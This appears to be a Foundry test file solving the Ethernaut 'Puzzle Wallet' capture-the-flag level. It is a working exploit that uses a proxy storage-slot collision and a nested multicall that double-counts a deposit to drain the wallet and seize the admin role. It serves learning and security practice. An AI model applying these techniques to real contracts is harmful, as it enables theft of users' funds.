// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {PuzzleWalletFactory} from "src/levels/PuzzleWalletFactory.sol";

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet {
    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address addr) external;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWalletTest is Test {
    PuzzleWalletFactory level;
    address target;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new PuzzleWalletFactory();
        player = makeAddr("PLAYER");
        target = level.createInstance{value: 0.001 ether}(player);
    }

    function test_PuzzleWallet() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.deal(player, 0.001 ether);
        vm.startPrank(player);

        // pendingAdmin stored at slot 0, read when accessing owner in PuzzleWallet
        IPuzzleProxy(target).proposeNewAdmin(player);

        IPuzzleWallet(target).addToWhitelist(player);

        bytes[] memory depositSig = new bytes[](1);
        depositSig[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](2);
        data[0] = depositSig[0];
        data[1] = abi.encodeWithSignature("multicall(bytes[])", depositSig);

        // To bypass depositCalled check, use nested multicall
        // Though player sends ether only once, balances[player] added twice
        IPuzzleWallet(target).multicall{value: 0.001 ether}(data);

        IPuzzleWallet(target).execute(player, 0.002 ether, "");

        // Modifying maxBalance overwrites slot 1(admin) at PuzzleProxy
        IPuzzleWallet(target).setMaxBalance(uint256(uint160(player)));

        vm.stopPrank();

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(target), player);
        assertEq(success, true);
    }
}
